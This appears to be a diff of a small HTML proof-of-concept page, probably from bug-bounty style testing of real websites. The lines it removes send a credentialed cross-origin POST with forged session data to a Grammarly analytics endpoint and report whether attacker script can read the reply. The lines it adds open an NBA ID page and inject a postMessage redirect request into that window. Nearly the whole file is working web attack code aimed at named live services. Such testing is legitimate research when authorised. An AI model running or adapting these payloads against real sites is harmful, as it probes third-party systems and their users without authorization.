@@ -1,79 +1,25 @@
 <!doctype html>
 <html>
 <body>
-<h1>CORS PoC</h1>
-<pre id="result">Starting...</pre>
+<button id="go">Open NBA ID and redirect</button>
 
 <script>
-(async () => {
-  const output = document.getElementById("result");
+document.querySelector("#go").onclick = () => {
+  const w = window.open(
+    "https://id.nba.com/voting",
+    "nba_test_window"
+  );
 
-  function log(msg) {
-    output.textContent += "\n" + msg;
-    console.log(msg);
-  }
-
-  output.textContent = "Starting CORS test...";
-
-  const controller = new AbortController();
-
-  const timeout = setTimeout(() => {
-    log("TIMEOUT: request did not complete within 10 seconds");
-    controller.abort();
-  }, 10000);
-
-  try {
-    log("About to call fetch()...");
-
-    const r = await fetch("https://gnar.grammarly.com/events", {
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
-      signal: controller.signal,
-      headers: {
-        "Content-Type": "application/json"
+  setTimeout(() => {
+    w.postMessage(
+      {
+        identifier: "redirectRequest",
+        url: "https://example.com/"
       },
-      body: JSON.stringify({
-        events: [
-          {
-            eventName: "cms/web-heartbeat",
-            batchId: 2,
-            instanceId: "F825AnnA",
-            pageHeartbeatSeconds: 2.234,
-            pageSlug: "signin",
-            clientName: "cms",
-            pageUrl: "https://www.grammarly.com/signin?is_sso=true",
-            domainName: "www.grammarly.com",
-            pageViewId: "d5c4a43a-c45d-4de2-b7ef-be777afd2c2c",
-            timestamp: Date.now(),
-            webSessionId: "69ffe323-7b59-4606-b933-251a81fa79f4",
-            referrer: "",
-            containerId: "jrfcavpobatu0980",
-            isUnload: true
-          }
-        ]
-      })
-    });
-
-    clearTimeout(timeout);
-
-    log("fetch() completed");
-    log("Status: " + r.status);
-    log("Response readable by attacker JS: YES");
-
-    const body = await r.text();
-
-    log("Response body:");
-    log(body || "[empty response body]");
-
-  } catch (e) {
-    clearTimeout(timeout);
-
-    log("FETCH FAILED");
-    log("Name: " + e.name);
-    log("Message: " + e.message);
-  }
-})();
+      "https://id.nba.com"
+    );
+  }, 3000);
+};
 </script>
 </body>
 </html>
